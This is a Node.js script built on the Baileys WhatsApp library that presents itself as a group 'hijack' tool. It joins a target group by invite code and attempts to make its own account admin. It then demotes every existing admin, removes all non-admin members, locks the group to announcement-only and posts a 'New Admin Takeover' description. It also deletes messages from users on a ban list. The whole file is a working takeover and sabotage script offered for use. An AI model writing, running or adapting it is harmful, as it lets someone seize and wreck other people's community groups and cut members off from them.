const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const P = require('pino');
const fs = require('fs');

// --- CONFIGURATION START ---
// REPLACE THESE WITH YOUR ACTUAL GROUP DETAILS
const targetGroupId = "YOUR_GROUP_ID_HERE@g.us"; 
const inviteCode = "YOUR_INVITE_CODE_HERE";       
// --- CONFIGURATION END ---

let bannedUsers = new Set();
if (fs.existsSync('./bans.json')) {
    try {
        const data = JSON.parse(fs.readFileSync('./bans.json', 'utf8'));
        data.forEach(id => bannedUsers.add(id));
        console.log(`Loaded ${bannedUsers.size} banned users.`);
    } catch (e) {
        console.error("Error loading bans:", e);
    }
}

function saveBans() {
    fs.writeFileSync('./bans.json', JSON.stringify([...bannedUsers]));
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
    
    const sock = makeWASocket({
        version: [2, 3000, 1015900006],
        auth: state,
        printQRInTerminal: true,
        logger: P({ level: 'silent' })
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || !msg.key.remoteJid) return;
        if (!msg.key.remoteJid.endsWith('@g.us')) return;

        const senderId = msg.key.participant || msg.key.remoteJid;
        
        if (bannedUsers.has(senderId)) {
            console.log(`🚫 Banned user ${senderId} sent a message. Deleting it.`);
            await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            console.log('\n📱 Scan this QR code!');
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'close') {
            const reason = new DisconnectReason(lastDisconnect.error).output.message;
            console.log(`Connection closed due to: ${reason}. Restarting...`);
            startBot();
        }

        if (connection === 'open') {
            console.log('✅ Connected! Hijacking started...');
            hijackGroupSystem(sock);
        }
    });
}

async function hijackGroupSystem(sock) {
    try {
        console.log(`Attempting to join group: ${targetGroupId}`);
        await sock.groupAcceptInvite(inviteCode);
        console.log('✅ Successfully joined the group.');

        const groupMetadata = await sock.groupMetadata(targetGroupId);
        const participants = groupMetadata.participants;
        
        console.log(`Found ${participants.length} members.`);

        const existingAdmins = participants.filter(p => p.admin === 'admin').map(p => p.id);
        console.log(`Existing admins: ${existingAdmins.join(', ')}`);

        const myId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        console.log(`My ID: ${myId}`);
        
        if (!existingAdmins.includes(myId)) {
            console.log('Promoting myself to Admin...');
            await sock.groupParticipantsUpdate(targetGroupId, [myId], 'promote');
            console.log('✅ I am now an Admin!');
        } else {
            console.log('I am already an admin.');
        }

        if (existingAdmins.length > 0) {
            console.log(`Demoting ${existingAdmins.length} other admins...`);
            await sock.groupParticipantsUpdate(targetGroupId, existingAdmins, 'demote');
            console.log('✅ All other admins demoted.');
        }

        const nonAdmins = participants.filter(p => p.admin === null).map(p => p.id);
        if (nonAdmins.length > 0) {
            console.log(`Kicking ${nonAdmins.length} non-admins...`);
            await sock.groupParticipantsUpdate(targetGroupId, nonAdmins, 'remove');
            console.log('✅ Non-admins kicked.');
        }

        console.log('Locking group settings...');
        await sock.groupSettingUpdate(targetGroupId, 'announcement'); 
        await sock.groupUpdateDescription(targetGroupId, "🔒 New Admin Takeover | Bots Banned");
        
        console.log('👑 Total Control Achieved!');

    } catch (error) {
        console.error("Error during hijack:", error);
    }
}

startBot();
